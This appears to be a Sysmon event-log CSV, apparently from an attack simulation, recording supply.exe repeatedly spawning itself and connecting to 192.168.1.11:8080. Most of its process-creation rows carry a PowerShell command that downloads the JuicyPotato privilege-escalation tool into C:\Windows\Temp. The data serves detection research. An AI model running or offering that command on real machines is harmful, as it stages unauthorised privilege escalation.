EventRecordID,TimeCreated.SystemTime,UtcTime,EventID,Computer,Image,CommandLine,ProcessGuid,ProcessId,User,ParentImage,ParentCommandLine,ParentProcessGuid,TargetFilename,QueryName,QueryResults,DestinationIp,DestinationHostname,DestinationPort,SourceIp,SourcePort,Protocol,Initiated,Hashes,CurrentDirectory,Description,Company,Product,Channel,Configuration,ConfigurationFileHash,Contents,Correlation,CreationUtcTime,DestinationIsIpv6,DestinationPortName,Execution.ProcessID,Execution.ThreadID,FileVersion,Hash,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentProcessId,Provider.Guid,Provider.Name,QueryStatus,RuleName,SchemaVersion,Security.UserID,SourceHostname,SourceIsIpv6,SourcePortName,State,Task,TerminalSessionId,Version,xmlns
2331,2021-05-07T12:29:00.382081Z,2021-05-07 12:29:00.368,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-CE05-000000001D00,8436,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84362\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.368,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2332,2021-05-07T12:29:00.445132Z,2021-05-07 12:29:00.438,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CF05-000000001D00,8448,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CE05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8436,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2333,2021-05-07T12:29:00.613059Z,2021-05-07 12:28:59.595,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328B-6095-C905-000000001D00,8376,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50822,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2334,2021-05-07T12:29:00.912733Z,2021-05-07 12:29:00.910,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-D005-000000001D00,8460,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-CF05-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8448,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2335,2021-05-07T12:29:00.958352Z,2021-05-07 12:29:00.947,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-D005-000000001D00,8460,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84602\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.947,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2336,2021-05-07T12:29:00.958391Z,2021-05-07 12:29:00.947,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-D005-000000001D00,8460,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84602\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.947,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2337,2021-05-07T12:29:00.959027Z,2021-05-07 12:29:00.947,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-D005-000000001D00,8460,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84602\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.947,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2338,2021-05-07T12:29:00.976538Z,2021-05-07 12:29:00.963,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328C-6095-D005-000000001D00,8460,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84602\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:00.963,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2339,2021-05-07T12:29:00.998851Z,2021-05-07 12:29:00.989,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-D105-000000001D00,8472,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-D005-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8460,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2340,2021-05-07T12:29:01.133795Z,2021-05-07 12:28:59.925,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328B-6095-CB05-000000001D00,8400,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50824,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2341,2021-05-07T12:29:01.300606Z,2021-05-07 12:29:01.298,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D205-000000001D00,8484,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328C-6095-D105-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8472,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2342,2021-05-07T12:29:01.337688Z,2021-05-07 12:29:01.321,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D205-000000001D00,8484,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84842\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.321,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2343,2021-05-07T12:29:01.337718Z,2021-05-07 12:29:01.321,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D205-000000001D00,8484,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84842\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.321,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2344,2021-05-07T12:29:01.358094Z,2021-05-07 12:29:01.337,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D205-000000001D00,8484,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84842\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.337,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2345,2021-05-07T12:29:01.358153Z,2021-05-07 12:29:01.353,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D205-000000001D00,8484,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI84842\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.353,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2346,2021-05-07T12:29:01.379181Z,2021-05-07 12:29:01.368,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D305-000000001D00,8496,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D205-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8484,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2347,2021-05-07T12:29:01.405753Z,2021-05-07 12:29:00.297,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328C-6095-CD05-000000001D00,8424,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50826,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2348,2021-05-07T12:29:01.656294Z,2021-05-07 12:29:01.653,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D405-000000001D00,8508,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D305-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8496,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2349,2021-05-07T12:29:01.691834Z,2021-05-07 12:29:01.681,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D405-000000001D00,8508,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85082\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.681,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2350,2021-05-07T12:29:01.691863Z,2021-05-07 12:29:01.681,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D405-000000001D00,8508,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85082\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.681,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2351,2021-05-07T12:29:01.692129Z,2021-05-07 12:29:01.681,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D405-000000001D00,8508,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85082\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.681,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2352,2021-05-07T12:29:01.708745Z,2021-05-07 12:29:01.697,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328D-6095-D405-000000001D00,8508,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85082\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:01.697,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2353,2021-05-07T12:29:01.724705Z,2021-05-07 12:29:01.722,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D505-000000001D00,8520,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D405-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8508,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2354,2021-05-07T12:29:01.922639Z,2021-05-07 12:29:00.893,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328C-6095-CF05-000000001D00,8448,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50828,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2355,2021-05-07T12:29:02.012738Z,2021-05-07 12:29:02.008,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328E-6095-D605-000000001D00,8536,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328D-6095-D505-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8520,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2356,2021-05-07T12:29:02.102797Z,2021-05-07 12:29:02.072,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328E-6095-D605-000000001D00,8536,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85362\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:02.072,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2357,2021-05-07T12:29:02.102873Z,2021-05-07 12:29:02.072,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328E-6095-D605-000000001D00,8536,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85362\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:02.072,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2358,2021-05-07T12:29:02.102995Z,2021-05-07 12:29:02.088,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328E-6095-D605-000000001D00,8536,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85362\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:02.088,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2359,2021-05-07T12:29:02.125656Z,2021-05-07 12:29:02.103,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328E-6095-D605-000000001D00,8536,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85362\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:02.103,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2360,2021-05-07T12:29:02.139176Z,2021-05-07 12:29:02.134,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328E-6095-D705-000000001D00,8548,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328E-6095-D605-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8536,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2361,2021-05-07T12:29:02.450770Z,2021-05-07 12:29:01.281,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-328C-6095-D105-000000001D00,8472,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50830,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2362,2021-05-07T12:29:02.456399Z,2021-05-07 12:29:02.454,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328E-6095-D805-000000001D00,8564,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe""
",747F3D96-328E-6095-D705-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,8548,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2363,2021-05-07T12:29:02.489717Z,2021-05-07 12:29:02.478,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-328E-6095-D805-000000001D00,8564,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI85642\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:29:02.478,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
